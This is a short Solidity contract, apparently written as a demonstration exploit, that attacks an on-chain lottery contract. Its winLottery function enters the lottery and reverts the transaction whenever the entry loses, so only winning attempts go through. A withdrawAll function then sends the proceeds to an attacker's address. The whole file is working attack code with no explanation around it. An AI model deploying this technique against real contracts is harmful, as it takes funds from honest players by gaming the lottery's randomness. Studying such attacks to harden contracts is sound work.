pragma solidity ^0.8.4;
import "./Lottery.sol";
import "./libs/Ownable.sol";

interface ILottery{
    function enter() external virtual payable;
    // function getRoundBalance() external virtual view returns (uint256);
    function pickWinner() external virtual;
}


contract AttackOne is Ownable{
    //ILottery lottery;
    address lotteryAddr;
    address payable attackerAddr;

    constructor(address _lotteryAddr, address payable _attackerAddr) {
        //lottery = ILottery(lotteryAddr);
        lotteryAddr = _lotteryAddr;
        attackerAddr = _attackerAddr;

    }

    function winLottery() public payable {
        uint balanceBefore = address(this).balance;
        ILottery(lotteryAddr).enter{value:msg.value}();
        uint balanceAfter = address(this).balance;
        if (balanceAfter < balanceBefore){ 
            revert("you didnt win fren");
        }
    }       

    event attackerWonTheLottery(address, uint);
    receive() external payable {
        emit attackerWonTheLottery(msg.sender, msg.value);
    }

    function withdrawAll() public payable {
        attackerAddr.transfer(address(this).balance);
    }

}
